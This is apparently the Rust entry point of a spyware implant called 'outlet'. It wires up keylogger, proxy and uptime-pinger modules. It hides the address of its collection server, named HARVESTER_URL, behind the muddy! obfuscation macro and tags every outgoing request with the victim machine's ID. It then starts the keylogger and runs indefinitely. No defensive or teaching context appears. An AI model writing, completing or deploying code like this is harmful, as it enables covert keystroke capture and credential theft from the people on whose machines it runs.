use std::future::pending;

use env_logger::Env;
use log::info;
use muddy::muddy;
use once_cell::sync::Lazy;
use reqwest::{
    Client,
    header::{HeaderMap, HeaderValue},
};

mod uptime_pinger;
pub use uptime_pinger::uptime_pinger;

mod keylogger;
pub use keylogger::keylogger;

mod proxy;
pub use proxy::proxy;

static HARVESTER_URL: Lazy<&'static str> = Lazy::new(|| muddy!("localhost:6767"));
static MACHINE_ID: Lazy<String> =
    Lazy::new(|| machine_uid::machine_id::get_machine_id().unwrap_or("unknown".into()));

#[tokio::main]
async fn main() {
    env_logger::Builder::from_env(Env::default().default_filter_or("debug")).init();
    info!("outlet inited with machine id: {:?}", MACHINE_ID);

    let mut headers = HeaderMap::new();
    headers.insert("machine-id", HeaderValue::from_str(&MACHINE_ID).unwrap());
    let reqwest_client = Client::builder().default_headers(headers).build().unwrap();

    uptime_pinger(reqwest_client.clone());
    keylogger(reqwest_client.to_owned());

    info!("successfully inited, running forever!");
    pending::<()>().await;
}
